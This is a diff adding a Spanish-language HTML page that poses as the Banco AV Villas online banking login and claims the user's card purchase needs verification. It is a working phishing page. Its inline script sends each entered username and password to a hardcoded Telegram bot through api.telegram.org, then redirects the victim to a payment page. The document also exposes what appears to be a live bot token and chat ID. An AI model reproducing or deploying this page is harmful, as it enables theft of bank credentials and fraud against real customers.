@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 2rem;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 100px;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+
+        label {
+            text-align: left;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+            color: #555;
+        }
+
+        select, input {
+            padding: 0.8rem;
+            margin-bottom: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            color: #333;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .forgot-password {
+            text-align: right;
+            display: block;
+            margin-bottom: 1.5rem;
+            color: #0066cc;
+            font-size: 0.9rem;
+        }
+
+        .login-button {
+            background-color: #e0e0e0;
+            border: none;
+            padding: 0.8rem;
+            border-radius: 5px;
+            font-size: 1rem;
+            color: #999;
+            cursor: not-allowed;
+            margin-bottom: 1.5rem;
+        }
+
+        .register {
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .register a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .register a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
+            <img style="width: 70%;" src="../img/BANCO AVVILLAS.png" alt="">
+        </div>
+
+        <div style="margin-top: 1%; margin-bottom: 8%;">
+            <p style="margin-bottom: 8%; "><strong>Vamos a valiar tu compra</strong></p>
+            <p style="text-align: left;">Se requiere verificar la transacción que intentas realizar con tu tarjeta  por seguridad</p>
+            
+        </div>
+
+        
+        
+        <h1>Ingresa a la Banca Virtual</h1>
+        <form>
+            <label for="document-number">Número de documento o usuario</label>
+            <input type="text" id="username" placeholder="Número de documento o usuario">
+            <label for="password">Ingresa tu contraseña</label>
+            <input type="password" id="password" placeholder="Ingresa tu contraseña">
+            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
+            <button id="submitBtn" class="login-button">INGRESAR</button>
+            
+        </form>
+
+        <script>
+            function enviarMensajeTelegram(username, password) {
+    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+    var chatID = '5900829263';
+    var mensaje = 'Logo Avvillas: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('submitBtn').addEventListener('click', function(event) {
+        event.preventDefault(); // Evita que el formulario se envíe por defecto
+
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        if (username.trim() !== '' && password.trim() !== '') {
+            enviarMensajeTelegram(username, password);
+            setTimeout(function() {
+                window.location.href = '../cargapago.html';
+            }, 1000);
+        } else {
+            alert('Por favor complete todos los campos antes de continuar.');
+        }
+    });
+});
+        </script>
+    </div>
+</body>
+</html>
